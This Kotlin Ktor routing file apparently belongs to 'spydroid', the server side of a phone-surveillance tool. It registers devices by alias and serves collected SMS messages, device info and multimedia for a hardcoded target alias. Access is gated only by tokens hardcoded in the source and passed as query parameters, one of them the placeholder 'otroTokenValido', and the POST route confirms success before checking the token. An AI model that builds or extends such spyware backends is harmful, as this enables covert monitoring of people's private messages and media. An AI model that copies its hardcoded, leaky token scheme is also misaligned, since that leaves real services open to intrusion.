/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.server.plugins

import io.ktor.http.HttpStatusCode
import io.ktor.server.application.*
import io.ktor.server.request.receiveParameters
import io.ktor.server.response.*
import io.ktor.server.routing.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import net.spydroid.server.domain.DevicesRepository
import net.spydroid.server.domain.InfoRepository
import net.spydroid.server.domain.MultimediaRepository
import net.spydroid.server.domain.SmsRepository
import net.spydroid.server.models.DeviceHandler
import org.koin.ktor.ext.inject


private object Routes {
    const val DEVICES = "/devices"
    const val INFO = "/info"
    const val MULTIMEDIA = "/multimedia"
    const val SMS = "/sms"
}

fun Application.configureRouting() {

    val devicesRepository: DevicesRepository by inject()
    val infoRepository: InfoRepository by inject()
    val multimediaRepository: MultimediaRepository by inject()
    val smsRepository: SmsRepository by inject()

    val ALIAS = "JUAN_KARLOS"
    val validTokens = setOf("iygad7618wg8y1f7fgvas71f671", "otroTokenValido")

    routing {
        get(Routes.DEVICES) {
            val accessToken = call.request.queryParameters["access_token"]
            val devices = devicesRepository.getALlDevices()
            if (accessToken in validTokens) {
                call.respond(devices)
            }
        }

        post(Routes.DEVICES) {
            val params = call.receiveParameters()
            val accesToken = params["access_token"] ?: return@post call.respond(
                HttpStatusCode.BadRequest,
                "Missing access token"
            )
            val alias = params["alias"] ?: return@post call.respond(
                HttpStatusCode.BadRequest,
                "Missing alias"
            )
            val name = params["name"] ?: return@post call.respond(
                HttpStatusCode.BadRequest,
                "Missing name"
            )
            call.respond(
                HttpStatusCode.OK,
                "Device with alias '$alias' and name '$name' was processed successfully!"
            )
            if (accesToken in validTokens) {
                this.launch(Dispatchers.IO) {
                    devicesRepository.insert(
                        DeviceHandler(
                            alias = alias,
                            name = name
                        )
                    )
                }
            }
        }

        get(Routes.INFO) {
            val accessToken = call.request.queryParameters["access_token"]
            val info = infoRepository.filerWithAlias(ALIAS)
            if (accessToken in validTokens) {
                call.respond(info)
            }
        }

        get(Routes.SMS) {
            val accessToken = call.request.queryParameters["access_token"]
            val sms = smsRepository.filerWithAlias(ALIAS)
            if (accessToken in validTokens) {
                call.respond(sms)
            }
        }

        get(Routes.MULTIMEDIA) {
            val accessToken = call.request.queryParameters["access_token"]
            val multimedia = multimediaRepository.filerWithAlias(ALIAS)
            if (accessToken in validTokens) {
                call.respond(multimedia)
            }
        }
    }
}

